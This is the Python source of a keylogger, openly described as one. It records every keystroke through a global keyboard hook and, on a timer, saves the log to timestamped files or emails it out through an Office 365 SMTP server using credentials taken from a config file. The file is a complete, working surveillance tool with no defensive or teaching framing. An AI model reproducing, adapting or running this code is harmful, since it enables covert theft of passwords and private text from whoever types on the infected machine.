'''
This is a keylogger program written in Python that captures keystrokes and saves them either to a file or sends them via email
at regular intervals. The user can choose the reporting method and the time between reports. The program uses the 'keyboard' module
for keystroke capturing and the 'smtplib' module for sending emails. The program also handles special characters such as space, enter,
and decimal. The email reporting method requires the user to provide their email and password for authentication. The program can
be started by running the Python script and following the prompts.
 
'''
import keyboard
import smtplib
import pathlib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from configparser import ConfigParser


config_path = pathlib.Path(__file__).parent.absolute() / "config.ini"

config = ConfigParser()
config.read(config_path)

# Set how longer will be the inteval between the report logs are written from config.ini
reportTimer = int(config['KEYLOGGER']['time'])

# Set the report method from config.ini
repMethod = config['KEYLOGGER']['method']


# The Keylogger class contains methods for capturing keystrokes, updating the filename, reporting to a file, preparing an email
# message, sending an email, and reporting the keystrokes based on the chosen method.
class Keylogger:
    
    def __init__(self, interval, method):
        
        self.interval = interval
        self.method = method
        self.log = ""
        self.startDt = datetime.now()
        self.endDt = datetime.now()


    def callback(self, event):
        
        name = event.name
        
        if len(name) > 1:
            
            if name == "space":
                name = " "
            
            elif name == "enter":
                name = "[ENTER]\n"
            
            elif name == "decimal":
                name == "."
            
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        
        self.log += name


    def updateFilename(self):
        
        startDtStr = str(self.startDt)[:-7].replace(" ", "-").replace(":", "")
        endDtStr = str(self.endDt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{startDtStr}_{endDtStr}"


    def reportToFile(self):
        
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        
        print(f"[+] Saved {self.filename}.txt")


    def prepEmail(self, message):
        
        msg = MIMEMultipart("alternative")
        msg["From"] = email
        msg["To"] = email
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        
        msg.attach(text_part)
        msg.attach(html_part)
        
        return msg.as_string()


    def sendMail(self, mail, password, message, verbose=1):
        
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        server.starttls()
        server.login(mail, password)
        server.sendmail(mail, mail, self.prepEmail(message))
        server.quit()

        if verbose:
            print(f"{datetime.now()} - Sent as email to {email} containing {message}")


    def report(self):
        
        if self.log:
            self.endDt = datetime.now()
            self.updateFilename()

            if self.method == "email":
                self.sendMail(email, passwd, self.log)
            
            elif self.method == "file":
                self.reportToFile()

            print(f"[{self.filename}] - {self.log}")
            self.startDt = datetime.now()

        self.log = ""

        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
    
        
# starts the keylogging process by registering a callback function for keyboard.on_release() and then starting a timer for the 
# report method, which is responsible for reporting the keystrokes at the specified interval.
    def start(self):
        
        self.startDt = datetime.now()
        keyboard.on_release(callback=self.callback)
        
        self.report()
        
        print(f"{datetime.now()} - Started keylogging")
        keyboard.wait()


if __name__ == "__main__":
    
    if repMethod == 'email':
        email = config['EMAIL']['login']
        passwd = config['EMAIL']['password']
        keylogger = Keylogger(interval=reportTimer, method='email')
        keylogger.start()
    
    elif repMethod == 'file':
        keylogger = Keylogger(interval=reportTimer, method='file')
        keylogger.start()
